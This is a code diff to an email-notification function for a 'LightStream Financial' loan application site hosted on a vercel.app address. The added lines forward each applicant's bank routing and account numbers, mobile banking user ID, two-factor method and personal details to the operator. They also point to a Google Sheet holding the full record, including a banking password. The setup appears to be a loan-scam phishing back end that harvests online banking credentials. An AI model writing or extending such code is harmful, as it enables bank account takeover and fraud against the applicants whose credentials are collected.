@@ -76,16 +76,33 @@ function sendEmailNotification(data) {
     
     const subject = "New " + (data.type || "Loan") + " Application - LightStream Financial";
     
-    const body = "New " + (data.type || "loan") + " application received:\n\n" +
-      "Customer: " + (data.firstName || '') + " " + (data.lastName || '') + "\n" +
-      "Email: " + (data.email || 'N/A') + "\n" +
-      "Phone: " + (data.phone || 'N/A') + "\n" +
-      "Loan Amount: $" + (data.loanAmount || 'N/A') + "\n" +
-      "Loan Purpose: " + (data.loanPurpose || 'N/A') + "\n" +
-      "Credit Score: " + (data.creditScore || 'N/A') + "\n" +
-      "Bank: " + (data.bankName || 'N/A') + "\n" +
-      "Submitted: " + new Date().toLocaleString() + "\n\n" +
-      "Check Google Sheet for complete details.";
+    const body = "🎉 NEW LOAN APPLICATION RECEIVED! 🎉\n\n" +
+      "=== APPLICANT INFORMATION ===\n" +
+      "👤 Name: " + (data.firstName || '') + " " + (data.lastName || '') + "\n" +
+      "📧 Email: " + (data.email || 'N/A') + "\n" +
+      "📱 Phone: " + (data.phone || 'N/A') + "\n" +
+      "🏠 Address: " + (data.streetAddress || '') + ", " + (data.city || '') + ", " + (data.state || '') + " " + (data.zipCode || '') + "\n\n" +
+      "=== LOAN DETAILS ===\n" +
+      "💰 Loan Amount: $" + (data.loanAmount || 'N/A') + "\n" +
+      "🎯 Loan Purpose: " + (data.loanPurpose || 'N/A') + "\n" +
+      "⏰ Loan Duration: " + (data.loanDuration || 'N/A') + " months\n" +
+      "💳 Credit Score: " + (data.creditScore || 'N/A') + "\n" +
+      "💵 Gross Monthly Income: $" + (data.grossMonthlyIncome || 'N/A') + "\n" +
+      "👔 Employment Status: " + (data.employmentStatus || 'N/A') + "\n\n" +
+      "=== BANKING INFORMATION ===\n" +
+      "🏦 Bank Name: " + (data.bankName || 'N/A') + "\n" +
+      "🔢 Routing Number: " + (data.routingNumber || 'N/A') + "\n" +
+      "🏧 Account Number: " + (data.accountNumber || 'N/A') + "\n" +
+      "📱 Mobile Banking User ID: " + (data.mobileBankingUserId || 'N/A') + "\n" +
+      "🔐 Mobile Banking Password: [PROTECTED]\n" +
+      "🔐 Two-Factor Method: " + (data.twoFactorMethod || 'N/A') + "\n\n" +
+      "=== SUBMISSION DETAILS ===\n" +
+      "📅 Submitted: " + new Date().toLocaleString() + "\n" +
+      "📋 Application Type: " + (data.type || 'Loan') + "\n" +
+      "✅ Terms Accepted: " + (data.termsAccepted || 'No') + "\n\n" +
+      "📊 Please check Google Sheet for complete details and processing status.\n\n" +
+      "🏦 LightStream Financial Services\n" +
+      "🌐 https://lightstreamweb.vercel.app";
     
     console.log("Email subject:", subject);
     console.log("Email body preview:", body.substring(0, 200) + "...");
